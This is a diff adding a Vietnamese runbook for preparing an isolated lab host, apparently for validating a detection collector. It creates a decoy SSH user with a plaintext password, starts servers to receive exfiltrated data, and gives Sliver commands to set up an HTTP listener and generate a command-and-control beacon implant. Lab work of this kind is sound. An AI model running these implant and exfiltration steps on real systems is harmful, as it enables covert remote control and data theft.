@@ -1,0 +1,40 @@
+LAB-2 — Người dùng chuẩn bị trên 202 (qua SSH cô lập từ 201)
+============================================================
+ssh -p 22022 root@192.168.77.20
+
+--- (b) User bẫy SSH ---
+useradd -m lab2victim || true
+echo 'lab2victim:Lab2Victim!2026' | chpasswd
+# SSH đã nghe :22022 — KHÔNG mở ra mạng thật.
+
+--- (c) Server nhận egress (hai cổng: tấn công + backup song sinh) ---
+mkdir -p /root/lab
+# copy script từ 201:
+#   scp -P 22022 /root/collector/scripts/lab2_egress_recv.py root@192.168.77.20:/root/lab/
+nohup python3 /root/lab/lab2_egress_recv.py --bind 192.168.77.20 --port 18080 --log /root/lab/egress-recv.log >/root/lab/egress-18080.out 2>&1 &
+nohup python3 /root/lab/lab2_egress_recv.py --bind 192.168.77.20 --port 18081 --log /root/lab/egress-recv-benign.log >/root/lab/egress-18081.out 2>&1 &
+ss -tlnp | grep -E '18080|18081'
+
+--- (a) Sliver implant (THAO TÁC TAY — sliver-client tương tác) ---
+# Tren 202, vao sliver-client (operator da co):
+#   sliver-client
+# Tao listener HTTP trong mang co lap (hoac dung mTLS). Vi du HTTP:
+#   http --lhost 192.168.77.20 --lport 8080
+# Sinh beacon:
+#   generate beacon --os linux --arch amd64 --http 192.168.77.20:8080 --seconds 60 --jitter 30 --save /root/lab/implant-lab2
+#   (hoac --mtls 192.168.77.20:<cong> neu dung mTLS / cong 31337 neu phu hop)
+# Thoat sliver-client. Tren 201:
+#   scp -P 22022 root@192.168.77.20:/root/lab/implant-lab2 /root/collector/validation/lab2-20261108/implant/implant-lab2
+#   chmod +x /root/collector/validation/lab2-20261108/implant/implant-lab2
+#   sha256sum /root/collector/validation/lab2-20261108/implant/implant-lab2
+# Ghi vao validation/lab2-20261108/implant-meta.txt:
+#   listener=<ten>
+#   proto=http|mtls
+#   host=192.168.77.20
+#   port=<cong>
+#   seconds=60
+#   jitter=30
+#   sha256=<hash>
+# KHONG commit implant; KHONG in khoa.
+
+Khi xong (a)(b)(c): bao Cursor "202 san sang lab2" de chay phien thu A2.
